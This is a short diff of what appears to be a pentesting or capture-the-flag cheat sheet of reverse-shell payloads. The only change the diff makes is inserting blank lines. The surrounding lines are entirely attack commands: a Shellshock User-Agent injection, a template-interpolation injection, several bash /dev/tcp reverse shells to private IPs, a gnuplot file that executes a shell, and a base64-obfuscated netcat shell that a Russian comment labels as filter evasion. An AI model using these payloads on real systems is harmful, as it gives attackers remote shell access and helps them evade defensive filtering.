@@ -34,7 +34,9 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&
 http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}
 
 bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
+
 /bin/bash -c 'bash -i >& /dev/tcp/192.168.50.123/4444 0>&1'
+
 echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.plt
 
 echo bmMgMTkyLjE2OC41MC4xMjMgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | bash   (обход фильтрации)
